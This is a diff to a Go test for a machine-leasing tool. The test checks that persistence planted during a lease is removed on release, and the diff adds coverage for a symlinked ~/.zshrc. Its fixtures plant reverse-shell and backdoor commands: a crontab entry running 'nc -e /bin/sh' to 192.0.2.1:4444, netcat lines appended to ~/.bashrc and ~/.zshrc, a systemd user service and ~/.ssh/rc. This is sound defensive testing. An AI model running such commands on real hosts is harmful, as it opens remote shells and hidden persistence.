@@ -193,11 +193,13 @@ func TestCleanupPersistence(t *testing.T) {
 	t.Parallel()
 	f := newFixture(t, nil)
 	f.c.sh("echo '# base' | crontab -u hostel -")
+	// A startup file that is a link (a dotfile manager): its target counts.
+	f.c.sh("mkdir -p ~/dotfiles && echo '# zsh' > ~/dotfiles/zshrc && ln -s dotfiles/zshrc ~/.zshrc")
 	bashrc := f.c.sh("cat /home/hostel/.bashrc")
 	lease := f.acquire()
 	f.e.mustHostel("run", "--", `echo '* * * * * nc -e /bin/sh 192.0.2.1 4444' | crontab - && `+
 		`mkdir -p ~/.config/systemd/user && printf '[Service]\nExecStart=/bin/sleep 1000\n' > ~/.config/systemd/user/door.service && `+
-		`echo 'nc 192.0.2.1 4444 &' >> ~/.bashrc && echo 'true door' > ~/.ssh/rc && chmod 000 ~/.config/systemd/user`)
+		`echo 'nc 192.0.2.1 4444 &' >> ~/.bashrc && echo 'true door' > ~/.ssh/rc && chmod 000 ~/.config/systemd/user && echo 'nc 192.0.2.1 4444 &' >> ~/.zshrc`)
 	f.e.mustHostel("release")
 	f.waitRoomFree()
 	if got := f.c.sh("crontab -l -u hostel 2>&1 || true"); got != "# base" {
@@ -209,11 +211,14 @@ func TestCleanupPersistence(t *testing.T) {
 	if got := f.c.sh("cat /home/hostel/.bashrc"); got != bashrc {
 		t.Fatalf(".bashrc after cleanup: changed")
 	}
+	if got := f.c.sh("readlink ~/.zshrc; cat ~/dotfiles/zshrc"); got != "dotfiles/zshrc\n# zsh" {
+		t.Fatalf("the linked .zshrc after cleanup: %q", got)
+	}
 	var d protocol.MachineDetails
 	if code := f.s.get("/v1/machines/home/box", f.s.token, &d); code != 200 {
 		t.Fatalf("GET /v1/machines/home/box: HTTP %d", code)
 	}
-	want := "removed persistence of the lease: crontab, ~/.bashrc, ~/.config/systemd/user, ~/.ssh/rc"
+	want := "removed persistence of the lease: /home/hostel/dotfiles/zshrc, crontab, ~/.bashrc, ~/.config/systemd/user, ~/.ssh/rc"
 	if !slices.ContainsFunc(d.Events, func(e protocol.Event) bool { return e.LeaseID == lease && e.Message == want }) {
 		t.Fatalf("events without %q: %+v", want, d.Events)
 	}
